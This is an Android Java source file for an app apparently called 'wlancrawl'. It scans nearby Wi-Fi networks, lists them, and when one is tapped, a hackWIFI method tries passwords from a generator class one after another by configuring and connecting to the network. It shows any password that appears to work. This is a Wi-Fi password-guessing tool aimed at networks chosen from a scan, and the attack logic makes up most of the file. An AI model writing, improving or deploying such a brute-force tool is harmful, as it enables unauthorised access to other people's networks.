package com.dominik.wlancrawl;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity
{
    private WifiManager wifi;
    private BroadcastReceiver wifiReciever;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // init wlan-manager
        wifi = (WifiManager)getSystemService(Context.WIFI_SERVICE);

        // enable Wifi
        if (!wifi.isWifiEnabled())
            wifi.setWifiEnabled(true);

        Button btnFindWlan = (Button) findViewById(R.id.btnFindWlan);
        btnFindWlan.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View view)
            {
                Log.i("WIFI", "clicked");
                scan();
            }
        });
    }

    @Override
    public void onStop()
    {
        super.onStop();

        if (wifiReciever != null)
            unregisterReceiver(wifiReciever);
    }

    private void scan()
    {
        wifiReciever = new WifiScanReceiver();
        registerReceiver(wifiReciever, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        wifi.startScan();
    }

    private boolean connect(String ssid, String key)
    {
        WifiConfiguration wc = new WifiConfiguration();
        wc.SSID = "\"".concat(ssid).concat("\"");
        wc.preSharedKey  = "\"".concat(key).concat("\"");

//        CheckBox mSSIDHidden = (CheckBox) findViewById(R.id.wifiCBhiddenssid);
//        wc.hiddenSSID = false;
//        if (mSSIDHidden.isChecked()) {
//            wc.hiddenSSID = true;
//        }

        // TEST
        wc.hiddenSSID = true;
        // END TEST

        wc.status = WifiConfiguration.Status.ENABLED;
        wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
        wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        wc.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
        wc.allowedProtocols.set(WifiConfiguration.Protocol.WPA);

        int res = wifi.addNetwork(wc);
        Log.d("WifiPreference", "add Network returned " + res );
        boolean b = wifi.enableNetwork(res, true);
        Log.d("WifiPreference", "enableNetwork returned " + b );
        boolean c = wifi.reconnect();
        Log.d("WifiPreference", "reconnect returned " + c );

        return (res != -1) && b && c;  // todo: how to recognise, when password was correct !?
    }

    private void hackWIFI(String ssid)
    {
        HackModul hackModul = new HackModul(ssid);
        String currentPas = "";
        while(hackModul.hasNext())
        {
            currentPas = hackModul.next();

            Log.i("WIFI", "try: " + currentPas);

            if (connect(ssid, currentPas))
            {
                if (wifi.pingSupplicant())
                {
                    Log.i("WIFI", "found wlan");
                    TextView txtPas = (TextView)findViewById(R.id.txtPassword);
                    String text = String.format(getString(R.string.password_for), ssid, currentPas);
                    txtPas.setText(text);
                    break;
                }
            }
        }
    }

    private class WifiScanReceiver extends BroadcastReceiver
    {
        public void onReceive(Context c, Intent intent)
        {
            List<ScanResult> scanResult = wifi.getScanResults();

            // build list and save results
            final List<String> wifiList = new ArrayList<String>();
            for (ScanResult result: scanResult)
            {
                wifiList.add(result.SSID);
            }

            ListView listWlan = (ListView)findViewById(R.id.listWifis);
            final ArrayAdapter<String> adapter = new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_list_item_1, wifiList);

            listWlan.setAdapter(adapter);

            listWlan.setOnItemClickListener(new AdapterView.OnItemClickListener()
            {
                @Override
                public void onItemClick(AdapterView<?> parent, final View view, int position, long id)
                {
                    final String item = (String) parent.getItemAtPosition(position);
                    hackWIFI(item);
                }
            });
        }
    }
}